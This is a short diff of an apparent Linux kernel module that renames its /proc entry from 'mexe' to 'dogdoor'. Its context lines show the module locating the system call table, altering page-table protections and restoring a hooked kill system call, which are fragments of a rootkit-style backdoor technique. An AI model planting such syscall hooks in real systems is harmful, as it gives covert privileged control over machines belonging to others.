@@ -102,7 +102,7 @@ static
 int __init m_init(void) {
 	unsigned int level;
 	pte_t* pte;
-	proc_create("mexe", S_IRUGO | S_IWUGO, NULL, &m_fops) ;
+	proc_create("dogdoor", S_IRUGO | S_IWUGO, NULL, &m_fops) ;
 
 	sctable = (void *) kallsyms_lookup_name("sys_call_table") ;
 
@@ -122,7 +122,7 @@ static
 void __exit m_exit(void) {
 	unsigned int level;
 	pte_t* pte;
-	remove_proc_entry("mexe", NULL) ;
+	remove_proc_entry("dogdoor", NULL) ;
 
 	sctable[__NR_kill] = orig_sys_kill;
 	pte = lookup_address((unsigned long) sctable, &level);
